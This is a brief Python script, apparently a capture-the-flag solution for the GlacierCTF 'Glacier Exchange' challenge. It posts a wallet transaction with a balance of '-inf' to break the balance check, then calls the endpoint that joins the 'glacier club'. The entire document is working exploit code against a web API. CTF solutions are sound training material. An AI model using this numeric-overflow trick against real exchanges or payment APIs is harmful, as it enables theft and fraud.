import requests


s = requests.Session()

BASE_URI = "https://glacierexchange.web.glacierctf.com"

resp = s.get(BASE_URI + "/api/wallet/balances")
print(resp.text)


resp = s.post(
    BASE_URI + "/api/wallet/transaction",
    json={"sourceCoin": "cashout", "targetCoin": "cashout", "balance": "-inf"},
)


resp = s.get(BASE_URI + "/api/wallet/balances")
print(resp.text)

resp = s.post(BASE_URI + "/api/wallet/join_glacier_club")
print(resp.text)
